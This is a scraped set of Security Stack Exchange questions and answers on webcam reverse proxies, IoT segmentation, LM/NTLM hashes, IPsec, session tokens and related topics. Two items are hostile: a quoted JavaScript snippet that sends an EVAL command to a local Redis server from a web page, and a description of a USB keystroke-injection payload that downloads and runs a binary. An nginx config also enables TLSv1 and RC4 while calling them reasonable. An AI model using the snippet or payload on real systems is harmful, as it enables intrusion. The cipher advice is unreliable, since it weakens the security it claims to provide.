<p>On local network can you see webcam at <code>http://192.168.0.123:456</code>?  Great.  Can you not connect to webcam from the outside world (that is <code>http://1.2.3.4:456</code> is firewalled off)?  Great.  If not reconfigure your webcam and port forwarding/firewall rules on your router.</p>

<p>Next, install a webserver on a computer on your local network that is on whenever you want to connect to your webcam.  I'm going to assume linux/unix and give instructions for nginx. </p>

<p>As a initial test, set up a reverse proxy with no encryption.  Install the latest version of nginx, edit the configuration file (<code>/etc/nginx/conf.d/default.conf</code>) and add lines similar to:</p>

<pre><code>server {
  listen 8080;
  location / {
      proxy_pass http://192.168.0.123:456; 
  } # replace with your webcam's local IP address and port.
}
</code></pre>

<p>Now restart nginx (<code>sudo /etc/init.d/nginx restart</code>) and try connecting to the proxy (<code>http://192.168.0.101:8080</code>) and it should work just like if you went to <code>http://192.168.0.123:456</code>.  If you have trouble, check everything again or <a href=""http://nginx.org/en/docs/beginners_guide.html#proxy"">consult the nginx documentation</a>.</p>

<p><strong>Getting A TLS/SSL Certificate</strong></p>

<p>Now you need to add a SSL certificate and the associated private key.  You can generate one signed by a certificate authority (e.g., from startssl.com for free) or generate one yourself that is self-signed (and will not be initially trusted by web browsers).  Setting up a CA-signed certificate will be more complicated for a home network where you'll have to get a domain name (that you can prove to the CA you own), set up dynamic DNS to that domain name, etc.  (If you are trying to get started with Dynamic DNS - <a href=""https://freedns.afraid.org/"">https://freedns.afraid.org/</a> is a great place to start).</p>

<p>To generate a self-signed certificate, first use openssl to create a private key (in this case a 4096-bit RSA private key):</p>

<pre><code># openssl genrsa -out private.key 4096
</code></pre>

<p>If you are curious you can view the contents with <code>openssl rsa -in private.key -text -noout</code>.  Next you need to generate a certificate based on that private key, which can be done with:</p>

<pre><code># openssl req -new -x509 -key private.key -out yourcert.crt -days 3650
</code></pre>

<p>The 3650 says it will expire in 3650 days (~10 years). Openssl will prompt you for more details, feel free to leave them blank or put any information in there.  (You can view the content of your certificate with <code>openssl x509 -in yourcert.crt -text -noout</code>).</p>

<p>Now put your private key and certificate somewhere safe (e.g., in  <code>/etc/ssl/private/private.key</code> and <code>/etc/ssl/certs/yourcert.crt</code>), restrict their permissions (make sure owned by root and no one else has read/write permissions).  </p>

<p><strong>Turn on SSL in Reverse Proxy</strong></p>

<p>Then edit your nginx server configuration file to enable SSL as follows:</p>

<pre><code>server {
   listen 443; # doesn't have to be port 443 - could be any port (say 8080) if you 
               # connect via https://192.168.0.101:8080 .  But on port 443
               # you can just use https://192.168.0.101
   ssl on;
   ssl_certificate  /etc/ssl/certs/yourcert.crt;
   ssl_certificate_key  /etc/ssl/private/private.key;
   # certificate and private key where you just placed them

   ssl_session_timeout  5m;    
   ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
   ssl_prefer_server_ciphers on;
   ssl_ciphers ""EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 EECDH EDH+aRSA RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS"";
   # reasonable SSL configuration, disable some known weak ciphers.

   location / {
     proxy_pass http://192.168.0.123:456;
     proxy_redirect http://192.168.0.123:456/ $scheme://$host:$server_port/;
 # If your webcam (or other proxied application) ever gives URLs in the HTTP headers
 # (e.g., in a 302 or 304 HTTP redirect),
 # the proxy_redirect line changes the URL in the HTTP header field
 # from http://192.168.0.123:456/some/path to https://192.168.0.1:8080/some/path
   }
}
</code></pre>

<p>Restart nginx, and now you should be able to connect to your webcam on your local network at <code>https://192.168.0.101</code> (you'll get warnings about certificate being untrusted as it is a self-signed certificate).  </p>

<p><strong>Setup port forwarding in your router</strong></p>

<p>The final step is to configure your router to do port forwarding.  That is when you connect to <code>https://1.2.3.4</code> (port 443) from the outside world, set it up to port-forward to <code>192.168.0.101</code> (port 443).  Possibly set up dynamic DNS so if your home IP address changes it still points to the right place.  Some ISPs do block port 80 and 443, so you may have to change it to some other port.</p>

<p>Be careful about how you connect.  I've noticed many IP camera programs do not check certificates for trust (as they are often self-signed), so an attacker could possibly do a MitM attack by inserting a different self-signed certificate.  It's best if you add your self-signed certificate to be trusted on your own browsers and reject it if it changes.</p>
","56795"
"How to design a home network for IoT devices?","19213","","<p>I'm trying to work out how best to design a home network which contains (potentially hostile) devices.  I'm running into my limits of networking knowledge!</p>

<p>I have two challenges.</p>

<p><strong>Unsecure Devices</strong></p>

<p>On my home network I have a Lifx WiFi lightbulb.  Lifx doesn't provide any security (no passwords) so any other device on the LAN can control it.</p>

<p>I'm happy for my phone and laptop to connect to the bulb - but I don't want my TV to have access to it.  Or vice-versa.</p>

<p><strong>Hostile Devices</strong></p>

<p>In a similar vein, I have a Nest Protect WiFi Smoke Alarm.  It is (theoretically) possible for a Nest employee to tunnel in to the device and gain full access to my network.</p>

<p>Is it possible to create a network which allows a device to connect to the Internet, but nothing on the LAN?</p>

<p><strong>Design</strong></p>

<p>So, what sort of steps can I take on a domestic Internet router to isolate devices which I don't necessarily want to give full access to my LAN?</p>

<p>My thoughts are...</p>

<ol>
<li>Disconnect the devices. That said, I <em>really</em> like being able to control my TV from my phone!</li>
<li>Create a different subnet for each device. My <a href=""http://www.ispreview.co.uk/index.php/2015/11/new-virgin-media-superhub3-cable-broadband-router-to-target-voip.html"">router</a> allows me to create a main network and a guest network.  I could put all my semi-trusted devices on a secondary network - but I'd lose the ability to control them while connected to the main network. Additionally, they'd still have the ability to interfere with each other.</li>
<li>DMZ? I'm unsure about this - would it isolate the IoT devices from the main LAN while still giving them Internet access?  I understand that the devices would be totally exposed to the net - giving anyone the ability to control the password-less devices, is that right?</li>
<li>Something else...?</li>
</ol>

<p>I have the feeling that what I want to do is impossible. Should I just accept that devices on my network can access each other and attempt to secure what I can?</p>
","<p>First you need to break the devices into classes of connectivity:</p>

<ol>
<li>Need just a constant ""cloud"" connection to work properly</li>
<li>Need no connection except for initial config/updates, need local connection</li>
<li>Need both a cloud connection and a local connection to work</li>
</ol>

<p>If you have a class of devices that are truly cloud-based (i.e. they don't use any local traffic, it all must go out to the internet and back) creating a SSID and VLAN that segregates traffic is a simple measure to make sure that any hostile activity it might be repurposed for is sheltered from high value targets like your backup server. Putting devices that need some sort of always-on connection in their own class keeps them sidelined if there is some sort of remote compromise of their command and control structure (the cloud.) </p>

<p>If you still need local access to some of those devices, say to give your phone just the ability to access port 80 on your TV or your light bulb (if that's how the smart remote works) a stateful firewall rule can enforce that only your phone, to only that port on the TV, will be allowed.  If your TV needs no internet access and only protected local access, this would fall into another category which would need it's own SSID, and if you really want it to be able to talk to the internet but no other devices, and be all by itself, it would need it's very own SSID and VLAN, which many can be created if needed.  </p>

<p>One measure that could also go a long way if your network is subject to transient devices (i.e. relatives tablets or laptops dropping by from time to time) is putting just those on a different VLAN, since for example your smart light bulb, unless you purposefully open a port from the internet at large, is of no harm even without a password since you (hopefully) trust all the other devices on your network to not be under malicious control.</p>

<p>Several inexpensive Wifi/Router devices that can be loaded with OpenWRT or DDWRT can be configured this way. The challenge isn't how to pull all this off, it's how to keep it all working smoothly and not throwing up your hands admitting that it's easier to just live under the spectre of network Armageddon in order to not have to unblock a port every time your phone TV app updates, and it says your TV firmware is now out of date.  If you're like most people, you just harden what you can: automatic or alerted updates on all devices that support it, smart firewall rules with anything like uPNP disabled, and carry on with your life.</p>
","118502"
"How secure is FileVault 2 while the computer is in sleep mode?","19213","","<p>How secure is Apples disk encryption FileVault 2 when someone has physical or network access while the computer in sleep mode or is running a screen saver? Are there ways to circumvent FileVault 2 when the computer is not turned off? </p>
","<p>Apparently FileVault 2 is secure against a <a href=""https://en.wikipedia.org/wiki/DMA_attack"">DMA Attack</a> if the screen isn't unlocked, since 10.7.2 (so make sure you're running Lion). My guess is that on sleep the keys are encrypted with your password, rather than just left in memory.</p>

<p>I'm assuming that it also means it is protected against a <a href=""https://en.wikipedia.org/wiki/Cold_boot_attack"">Cold Boot Attack</a> too.</p>

<p>The only sources I could find on it is this <a href=""http://ilostmynotes.blogspot.co.uk/2012/01/firewire-and-dma-attacks-on-os-x.html"">blog post</a>.</p>
","18721"
"Can a website make an HTTP request to ""localhost""? How does it get around the cross-domain policy?","19209","","<p>I found <a href=""http://benmmurphy.github.io/blog/2015/06/09/redis-hot-patch/"">this website</a> which talks about fixing a Redis vulnerability by exploiting that same vulnerability.</p>

<p>The website in question has a ""patch me"" button, and if you have a password-less Redis server running on your machine, it will patch it.</p>

<p>In other words, the website itself connects <strong>to the Redis Server in your computer</strong> and executes some commands.</p>

<p>If you look into the website code you find, predictably, this:</p>

<pre><code>    var text = ""the code to run"";
    var bad = ""EVAL ""  + JSON.stringify(text) + "" 0\r\n"";
    var x = new XMLHttpRequest();
    x.open(""POST"", ""http://localhost:6379"");
    x.send(bad);
</code></pre>

<p>To my surprise, this works!</p>

<p>I thought the Cross-Domain Policy would stop this from running, but it doesn't. </p>

<p>Why does this work, and how can I now not be paranoid that every website I go into is reading the entire contents of my Redis server?</p>

<p>It is because it's only writing but not reading? Still, any website in the world could <strong>empty</strong> my local Redis server / write to anything else listening to a port in my machine without authentication.</p>

<p>Am I missing anything here?</p>
","<p>To answer the question:  Yes a website can make an HTTP request to localhost.  It will not break cross domain policy, because the request will not cross domains.  It will stay local.  One way to avoid cross domain policies, is to get the target victim to make the HTTP request themselves.  Thus the request never crosses domains.  </p>

<p>To help you understand the issue you described: </p>

<p>The attack is not sending any data out, nor is it making a connection to anywhere other than the local Redis machine.  It's not the website itself connecting to your Redis machine.  It's <em>you</em> connecting to your Redis machine, executing client side code/scripts that <em>you</em> ran by clicking the link.  Basically:  You click link > Link downloaded and executes some code -> code generates an http request -> http request goes from your machine, to your machine.  </p>

<p>The vulnerability of the Redis server in this situation is Cross Site Request Forgery.  The attacker leverages the victims (in this case, the owner of the server) authentication to execute the attack.  </p>

<p>The attacker doesn't have full control over the process.  They rely on the owner of the Redis server to execute the code.  Only the owner (or someone else local to the Redis server) has the visibility (and perhaps the permission and trust relationship) to access 127.0.0.1 (Localhost) </p>

<p>All that the code can do is execute commands that the local user can execute, but it's not the attacker that executes them, it's the owner, and so no Cross Domain Policies are violated.  </p>

<p>The only people affected by links like that would be people running Redis servers.  If you don't have one, the link won't do anything.  Also, it will only run on the local Redis server.  The attacker can't really choose where the exploit will happen.</p>

<p>Look up Cross Site Request Forgery.  <a href=""https://en.wikipedia.org/wiki/Cross-site_request_forgery"" rel=""nofollow"">https://en.wikipedia.org/wiki/Cross-site_request_forgery</a></p>
","92009"
"SSL Certificate - is passphrase necessary and how does apache know it?","19168","","<p>I want to generate a Certificate Signing Request for my server and in order to do so, I first need a secure private key. When I create a private key by using <code>openssl genrsa -des3 -out server.key 2048</code>, I'm asked to provide a passphrase. After doing some research, I found out that not having passphrase is a high security risk because once my private key gets compromised, the hacker will be able to decrypt everything that was encrypted using my key.</p>

<p>My question is: how is my server supposed to work with a private key that needs a passphrase. Since it is headless, there is no way I can enter the key when my server boots. How is Apache going to handle that? </p>

<hr>

<p>I'm not asking how to remove the passphrase (I know how), I'm rather interested in how will my server be able to handle it and is it really a big security risk not to use a passphrase? I mean once the web server gets compromised, wouldn't it be easier to install a trojan horse?</p>
","<p>If you protect your private key with a passphrase, then Apache is unable to use it unless you supply Apache with the passphrase each time it restarts or you reboot.  And since keeping that passphrase stored in the filesystem would defeat the point of the passphrase, that means having some sort of method to pass the passphrase to Apache from externally, each time it restarts or you reboot.</p>

<p>Some people do this, but its impracticality means most people use a non-encrypted private key.</p>

<p>If your private key is not encrypted, then its protection comes from the fact that only your superuser can read it, and therefore relies heavily on the integrity of the system and how susceptible it is to privilege escalation or the like.</p>

<p>If your private key is compromised then you can go to the signing certificate authority and ask them to revoke the certificate.  Revocation is not a magic bullet however with some systems not checking for revocation and a typical delay between revoking a certificate and the information about the revocation being checked.</p>

<blockquote>
  <p>once my private key gets compromised, they hacker will be able to decrypt everything that was encrypted using my key.</p>
</blockquote>

<p>This scenario is the kind of thing <em>forward secrecy</em> is designed to prevent. In TLS the two communicating parties can, if they both have the necessary support, negotiate settings which enable forward secrecy, so that in the event the private key is compromised it's still impossible to decrypt past communications.</p>

<p>The <a href=""https://www.ssllabs.com/ssltest/"" rel=""noreferrer"">SSL Server Test</a> can check to see if Forward Secrecy, among other things, is working on your server.</p>
","70524"
"Chrome showing cryptography as 'obsolete'","19150","","<p>Similar to <a href=""https://security.stackexchange.com/questions/83831/google-chrome-your-connection-to-website-is-encrypted-with-obsolete-cryptograph"">this question</a>, Chrome is showing the connection cryptography as obsolete. Opera, IE and Firefox seem perfectly fine with the connection.</p>

<p><img src=""https://i.stack.imgur.com/PWDlo.png"" alt=""enter image description here""></p>

<p>My guess would be the message authentication is using <code>SHA1</code>, but when I view the certificate information, the only mention of SHA1 is the Thumbprint. This appears normal for Windows systems. What exactly is 'message authentication' referring to and what do I need to change server-side to fix this?</p>
","<p>As described in <a href=""https://security.stackexchange.com/a/83891/37315"">this answer</a> and <a href=""https://codereview.chromium.org/703143003"" rel=""nofollow noreferrer"">in this commit to chrome</a> only AEAD ciphers are considered state of the art security. It looks like that your server does not use the cipher preference of the client but instead has their own preference which looks like this:</p>

<pre><code>ECDHE-RSA-AES256-GCM-SHA384
ECDHE-RSA-AES256-SHA384
ECDHE-RSA-AES256-SHA
...
ECDHE-RSA-AES128-GCM-SHA256
ECDHE-RSA-AES128-SHA256
ECDHE-RSA-AES128-SHA
...
</code></pre>

<p>This means you prefer ECDHE-RSA-AES256-SHA to ECDHE-RSA-AES128-GCM-SHA256 and thus the chosen cipher based on Chromes offer will be AES256-SHA256, because it look like Chrome does not support the SHA384 ciphers. To fix it you might change the order and put the GCM ciphers on top of the preference list. </p>
","85544"
"avoid hitting DB to authenticate a user on EVERY request in stateless web app architecture?","19143","","<p><strong>Summary</strong></p>

<p>Once a user logs into a web site and his username/password credentials are verified and an active session is established, is it possible to avoid hitting the DB for each and every request from that user? What is the recommended method of securely authenticating subsequent requests for the life of the session, while minimizing DB queries and other internal network traffic?</p>

<p><strong>Background</strong></p>

<p>In a stateless web app server architecture, where each request has no knowledge of any prior activity from the user, it would be necessary to query the DB on each and every request from that user (typically by querying the session ID stored in a cookie and transferred in the request header). But what if some basic information was encrypted and stored in that Session cookie that had enough information to validate the user for non-sensitive, non-editable requests? For such requests, you could as an example encrypt and store the user ID and something that uniquely identifies his machine as much as possible (user-agent + ip address) in the Session data. The key used to encrypt the data could change daily making it difficult for any hacker to clone the Session data on a different machine. When the Session expires you would need to fully validate the user's credentials. The fact is, the biggest threat to hacking a user's session would be someone using a user's computer that he or she left unattended. Should I just not worry about this and let some level of caching between the web app servers and the DB take care of expediting the authentication process? While it may seem to be unnecessary optimization, it seems like a candidate ripe for improvements in efficiency since each and every request requires this process. Thanks for any suggestions!</p>
","<p><strong>Yes</strong> it is possible, and this technique is widely used.</p>

<p>It does have some minor drawbacks compared to stateful sessions:</p>

<ol>
<li>It does not support strong logout. If a user clicks logout, the cookie is cleared from their browser. However, if an attacker has captured the cookie, they can continue to use it until the cookie expires.</li>
<li>The use of a server-side secret to create the tokens creates a single point of failure: if the secret is captured, an attacker can impersonate any user.</li>
</ol>

<p>Deciding whether to use stateless or stateful sessions depends on your performance and security requirements. Online banking would tend of use stateful sessions, while a busy blog would tend to use stateless sessions.</p>

<p>A few tweaks are required to your proposed scheme:</p>

<ol>
<li>Encrypting the token does not protect it from tampering. You want to use a Message Authentication Code (MAC) which does protect tampering. You may additionally want to use encryption, but that is less important.</li>
<li>You need to include a timestamp in the token and put a time limit on their validity. Somewhere around 15 minutes is sensible. Normally you would automatically re-issue shortly before the timeout, and usually the reissue would incur a database hit (although even that can be avoided)</li>
<li>Do not include the user's IP address in the token. Approximately 3% of users will legitimately change IP address during a web session, due to modem resets, changing WiFi hot spots, load balanced proxies and more. While you can include the user agent in the token, it is not normal to do that - consider it an advanced technique to use if you are sure you know what you're doing.</li>
<li>If an attacker captures a session cookie they can impersonate that user. There is nothing you can really do about. Instead, put all your effort into preventing an attacker capturing the cookie in the first place. Use SSL, use the ""secure"" cookie flag, fix all cross-site scripting flaws, etc. And have some user advice to lock their screen when their computer is unattended.</li>
</ol>

<p>I hope this is helpful to you. If anything is unclear or you need further information, leave a comment and I will see if I can help you further.</p>
","49160"
"NTLM/LM Hashes on Domain Controller","19126","","<p>I've noticed that when extracting password hashes from a domain controller (using Elcomsoft proactive password auditor) sometimes I'll get LM and NTLM hashes and other times I'll only get NTLM hashes.</p>

<p>I note that the NTLM + LM hashes (the accounts that contain both sets) are recovered orders of magnitude faster than the hashes that are only NTLM. </p>

<p>I'm curious as to why this is the case? </p>

<p>I understand that LM is the older and weaker of the two, but I don't understand why both LM and NTLM are being stored in these scenarios? </p>

<p>More importantly, given that it appears that NTLM hashes exclusively are the safer option, how can I enforce NTLM only and remove existing LM hashes for users? </p>
","<p>There' a pretty good <a href=""http://support.microsoft.com/kb/299656"" rel=""nofollow"">Microsoft KB</a> article on this exact subject.</p>

<p>Basically, LM is used for compatibility with older clients. Specifically, Windows 98 and below. If you do not have any older clients on the network, then the cause for both hashes is most likely due to the password length being &lt;15 characters.</p>

<blockquote>
  <p>When you set or change the password for a user account to a password
  that contains fewer than 15 characters, Windows generates both a LAN
  Manager hash (LM hash) and a Windows NT hash (NT hash) of the
  password.</p>
</blockquote>

<p>It appears that the reason for this is due to the hashing limitations of LM, and not security related.</p>

<blockquote>
  <p>In the event that the user's password is longer than 15 characters,
  the host or domain controller will not store the LM hash for the user;
  the LM response cannot be used to authenticate the user in this case.
  A response is still generated and placed in the LM Response field,
  using a 16-byte null value (0x00000000000000000000000000000000) as the
  LM hash in the calculation. This value is ignored by the target.</p>
</blockquote>

<p>It is advised to disable LM hashes as the protocol is severely broken as you suggested. For those who might not be aware, some of the problems with LM's include:</p>

<ul>
<li>Passwords are not case sensitive.</li>
<li>Password are split into 7 chars and hashed seperately, making brute force trivial.</li>
<li>Passwords are limited to a maximum of 14 characters in length.</li>
</ul>

<p>There are a couple methods to removing LM hashes listed on the KB article I mentioned, I will quote the GPO method in case the link goes bad.</p>

<p><strong>Method 1:</strong> Implement the NoLMHash Policy by Using Group Policy</p>

<p>To disable the storage of LM hashes of a user's passwords in the local computer's SAM database by using Local Group Policy (Windows XP or Windows Server 2003) or in a Windows Server 2003 Active Directory environment by using Group Policy in Active Directory (Windows Server 2003), follow these steps:</p>

<ol>
<li>In Group Policy, expand Computer Configuration, expand Windows Settings, expand Security Settings, expand Local Policies, and then click Security Options.</li>
<li>In the list of available policies, double-click Network security: Do not store LAN Manager hash value on next password change.</li>
<li>Click Enabled, and then click OK.</li>
</ol>
","56235"
"How can USB sticks be dangerous?","19094","","<p>We all know the story of the <a href=""http://arstechnica.com/security/2013/01/two-us-power-plants-infected-with-malware-spread-via-usb-drive/"">USB drive left outside a power plant</a> which was found by a worker and inserted into a computer to see the contents which then allowed a hack to ensue.</p>

<p>Here is my question, how? I get that code is executed but how? I would really like to be able to do this (for my own curiosity of course). I have always had a good grasp on security how to make things secure etc etc but things like viruses, trojans, USB drivers... how are they activated with little human interaction?</p>

<p>I would really like to learn about these things, I am a programmer/sys admin so would like to knock up a script but having never been taught or never have done it I dont know how or where to begin. I would really like a big discussion on this with as much information as possible.</p>
","<p>Take a look at <a href=""http://hakshop.myshopify.com/collections/usb-rubber-ducky"" rel=""noreferrer"">this USB keyboard</a>:</p>

<p><a href=""https://i.stack.imgur.com/97IfL.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/97IfL.jpg"" alt=""Rubber Ducky USB Device""></a></p>

<p>""But that's not a keyboard! That's an USB drive, silly!""</p>

<p>Actually, no.  It looks like a USB drive to you, but when it gets connected to a computer, it will report that it is a USB keyboard.  And the moment it is installed, it will start typing key sequences you programmed on it beforehand.  Any operating system I know automatically trusts USB keyboards and installs them as trusted input devices without requiring any user interaction the moment they are connected.</p>

<p><a href=""http://usbrubberducky.com/#!resources.md"" rel=""noreferrer"">There are various payloads available for it.</a> For example, there is one which types the keyboard input to open a shell, launches WGET to download a binary from the Internet, and runs it.</p>
","102874"
"When do I use IPsec tunnel mode or transport mode?","19051","","<p>I basically understand how tunnel mode and transport mode works, but I don't know when I should use one instead of another.</p>

<p>Among the two parties who want to communicate, if one computer B doesn't understand IPsec, I think they have to use tunnel mode, which puts original IP and payload into ESP and delivers the packet to a device near B who knows IPsec, and that device decrypts the packet and sends the decrypted packet to computer B.</p>

<p>But what if the two computer both know IPsec, can I use transport mode? Various articles mention that if two computer are in a intranet, use transport; if they are in different networks, use tunnel. Why? If two computers are in different networks and transport mode is used, what problem will happen?</p>

<p>(Try not to mention AH and so-called security gateway, I don't know what they are.)</p>
","<p>From Cisco: <a href=""http://www.ciscopress.com/articles/article.asp?p=25477"" rel=""nofollow"">http://www.ciscopress.com/articles/article.asp?p=25477</a></p>

<blockquote>
  <p>Tunnel mode is most commonly used between gateways, or at an
  end-station to a gateway, the gateway acting as a proxy for the hosts
  behind it.</p>
  
  <p>Transport mode is used between end-stations or between an end-station
  and a gateway, if the gateway is being treated as a host—for example,
  an encrypted Telnet session from a workstation to a router, in which
  the router is the actual destination.</p>
</blockquote>

<p>So what ARE the differences:</p>

<p>Tunnel mode protects any internal routing info by encrypting the IP header of the ENTIRE packet. The original packet is encapsulated by a another set of IP headers.</p>

<ul>
<li>NAT traversal is supported with the tunnel mode.</li>
<li>Additional headers are added to the packet; so there is less payload MSS</li>
</ul>

<p>Transport mode encrypts the payload and ESP trailer <strong>ONLY</strong>. IP header of the original packet <strong><em>is not</em></strong> encrypted.</p>

<ul>
<li>Transport mode is implemented for client-to-site VPN scenarios.</li>
<li>NAT traversal <strong>IS NOT</strong> supported with the transport mode.</li>
<li>MSS is higher</li>
</ul>

<p>Transport mode is usually with other tunneling protocols (GRE, L2TP) which is used to first encapsulate the IP data packet, then IPsec is used to protect the GRE/L2TP tunnel packets.</p>

<p>EDITED:</p>

<p>Here is a detailed read on the differences from Microsoft:
<a href=""http://technet.microsoft.com/en-us/library/cc757712%28v=ws.10%29.aspx"" rel=""nofollow"">http://technet.microsoft.com/en-us/library/cc757712%28v=ws.10%29.aspx</a></p>
","76311"
"Which security standards define the time of inactivity before locking the screen","19019","","<p>Security and usability are often colliding. When it comes to locking screens on workstations after a certain amount of inactivity this is definitely the case and complaints have to be expected from end users.</p>

<p>As far as my experience goes, locking the screen on a workstation after 10-15 minutes is considered best practice. To enforce such a policy it would help to reference an established security standard that says the same. Unfortunately I have only found standards so far that mention screen locking as a must, but do not suggest appropriate values for ""time of inactivity before locking"".</p>

<p>Is there any established standard I can reference? It would be especially nice if there would be 2 values, one for workstation use inside the company and one for laptop users who work on the road or the home office.</p>
","<p>The large standards (ISO, NIST) tend toward one-size fits all, the real intent is to promote careful consideration, and deliberate and informed decision making. Specific values such as these are a property of a good policy implementation, the slightly abstract standards tend to only recommend maxima or minima, if even.</p>

<p>Such a ""control"" is typically assigned a persistent, unique identifier by a particular standard, the common ones are suitable here are <strong>AC-11</strong> and <strong><em>SC-10</em></strong> (from <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r4.pdf"">NIST SP800-53</a>(PDF) ) and <strong>FTA_SSL</strong> (from ISO/IEC 15408, aka <em>Common Criteria for Information Technology Security Evaluation</em>, ""FTA"" is the class of access control, ""SSL"" refers to session locking).</p>

<p>Roughly from more-specific to less-specific:</p>

<ul>
<li><p><a href=""http://www.whitehouse.gov/sites/default/files/omb/memoranda/fy2006/m06-16.pdf"">OMB M-06-16</a> (PDF) U.S. Presidential Memorandum <em>Protection of Sensitive Agency Information</em></p>

<blockquote>
  <p>&nbsp;3. Use a ""time-out"" function for remote access and mobile devices requiring user re-
    authentication after 30 minutes inactivity; and</p>
</blockquote></li>
<li><p>Australian <a href=""http://www.asd.gov.au/publications/Information_Security_Manual_2013_Controls.pdf"">DSD Information Security Manual 2013 Controls</a>
Session and Screen locking, Control 0427</p>

<blockquote>
  <p>· configure the lock to activate either:</p>
  
  <ul>
  <li>after a maximum of 15 minutes of system user inactivity</li>
  <li>if manually activated by the system user</li>
  </ul>
</blockquote>

<p>(see also control 0428 which states 10 minutes for ""confidential"" and ""secret"" levels).
Unchanged in 2014 edition.</p></li>
<li><p>U.S. CNSS <a href=""https://www.cnss.gov/Assets/pdf/Final_CNSSI_1253.pdf"">CNSSI-1253</a> <em>Security Categorization And Control Selection For National Security Systems</em></p>

<p>Control AC-11 <em>Session lock</em></p>

<blockquote>
  <p>...not to exceed 30 minutes</p>
</blockquote></li>
<li><p><a href=""http://csrc.nist.gov/publications/nistpubs/800-53-Rev3/800-53-rev3-Annex2_updated_may-01-2010.pdf"">NIST SP800-53</a> <em>Recommended Security Controls for Federal Information Systems and Organizations</em></p>

<p><a href=""http://csrc.nist.gov/publications/nistpubs/800-46-rev1/sp800-46r1.pdf"">NIST SP800-46</a> 
<em>Guide to Enterprise Telework and Remote Access Security</em></p>

<p>Control AC-11 <em>Session Lock</em>:  Timeout is ""organization defined""
(See also Canadian <a href=""http://www.cse-cst.gc.ca/its-sti/publications/itsg-csti/itsg41-ann1-eng.html"">ITSG-41</a>)
Control SC-10 <em>Network Disconnect</em></p>

<p>SP800-46 suggests 15 minutes as appropriate for remote access (page 4-3)</p></li>
<li><p><a href=""https://www.pcisecuritystandards.org/documents/pci_dss_v2.pdf"">PCI-DSS v2</a></p>

<blockquote>
  <p>8.5.15 If a session has been idle for
  more than 15 minutes, require the user
  to re-authenticate to re-activate the
  terminal or session.</p>
</blockquote>

<p>(in v3 the requirement has been renumbered to 8.1.8, but otherwise unchanged)
and </p>

<blockquote>
  <p>12.3.8 Automatic disconnect of sessions
  for remote-access technologies after a
  specific period of inactivity</p>
</blockquote></li>
<li><p>U.S. FBI/DoJ <a href=""http://www.fbi.gov/about-us/cjis/cjis-security-policy-resource-center/view"">CJISD-ITS-DOC-08140-5.2</a> <em>Criminal Justice Information Services Security Policy</em></p>

<blockquote>
  <p>5.5.5 Session Lock</p>
  
  <p>The information system shall prevent further access to the system by initiating a session lock after a maximum of 30 minutes of inactivity, and the session lock remains in effect until [...]</p>
</blockquote></li>
<li><p>ECMA <a href=""http://www.ecma-international.org/publications/standards/Ecma-271.htm"">ECMA-271 <em>Extended Commercially Oriented Functionality Class for Security Evaluation</em></a></p>

<blockquote>
  <p>7.4.1.8 Session lock or terminate
         The TOE shall support a session lock. The TOE shall provide an idle process   monitor for each front-end
         which inhibits after a customer defined amount of time user interactions except user authentication.</p>
</blockquote>

<p>Rather old (December 1999) the same time frame as <a href=""http://en.wikipedia.org/wiki/ISO/IEC_27002"">ISO/IEC 17799:2000</a>, sadly never updated by ECMA. <em>TOE</em> is Target Of Evaluation, some <a href=""http://en.wikipedia.org/wiki/Common_Criteria""><em>Common Criteria</em></a> terminology. </p></li>
<li><p>ISO 27001:2005(E)/ISO 27002:2005(E)(see <a href=""http://www.gammassl.co.uk/research/27001annexAinsights.pdf"">this document for a useful overview</a>)
Control A.11.3.3 <em>Clear desk and clear screen policy</em>
§11.3.3.3 </p>

<blockquote>
  <p>The clear desk and clear screen policy should take into account the information classifications (see 7.2), legal and contractual requirements (see 15.1), and the corresponding risks and cultural aspects of the organization. </p>
</blockquote>

<p>See also §11.5.5 <em>Session time-out</em></p></li>
<li><p>Council On CyberSecurity <a href=""http://www.counciloncybersecurity.org/critical-controls/""><em>Critical Security Controls</em> v5.1</a></p>

<blockquote>
  <p>CSC 16-6 Configure screen locks on systems to limit access to
          unattended workstations.</p>
</blockquote></li>
<li><p>CERT <a href=""http://www.cert.org/resilience/download/KIM_PA.pdf"">Knowledge and Information Management (KIM)</a>
<em>KIM:SG4.SP2 Control Access to Information Assets</em></p>

<blockquote>
  <p>[...] The organization must decide upon the right mix of controls to
  address the various forms of the information asset and any special
  considerations of the asset.</p>
</blockquote></li>
</ul>

<p>There's absolutely nothing wrong with using your own values <em>once you have properly defined your risks and requirements, and documented the decisions</em>. You may even decide on session lock exemptions (e.g. in the case of air traffic control, or locations with enhanced physical security), or mandate proximity devices.</p>
","45472"
"Securing passwords for REST Authentication","19009","","<p>I'm developing a REST application using the Spring Framework, as as part of the requirements, we have to secure the different functions of the system to different user roles (pretty standard stuff). My current method of determining the roles for the currently logged in user is that every time they call a REST url from the frontend, I am adding a Base 64 encoded string to the request header. This string when decoded resolves to their username and a bCrypt generated password hash in this format username:hashedpassword.</p>

<p>I'm slightly concerned that this is not secure, even though the request will be made over a secure HTTP connection, because it could give a potential hacker access to at least the users username. They couldn't get the password because that is just a hashed value, but they could use that hashed value to call the REST API successfully. </p>

<p>How can I secure this system properly? Do I need to add in a session token or some kind of randomly generated key for the session? </p>

<p>My followup question is then how can I do that RESTfully? I was thinking that I could generate (using bCrypt) a hash that represented the username:hashedpassword together on login, save that to the database and check against that whenever a REST call is made. When the user logs out, just set that to null. Rinse and Repeat. That way any potential attacker would only get a single bCrypt string that wouldn't expose the username, but they could still use that string to call the REST API.</p>
","<p>The following links may provide you with an in-depth answer:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/53952/rest-security-standards/53973"">REST security standards</a></li>
<li><a href=""https://security.stackexchange.com/questions/7057/i-just-send-username-and-password-over-https-is-this-ok"">I just send username and password over https. Is this ok?</a></li>
<li><a href=""https://stackoverflow.com/questions/3461298/password-hashing-non-ssl"">https://stackoverflow.com/questions/3461298/password-hashing-non-ssl</a></li>
</ul>

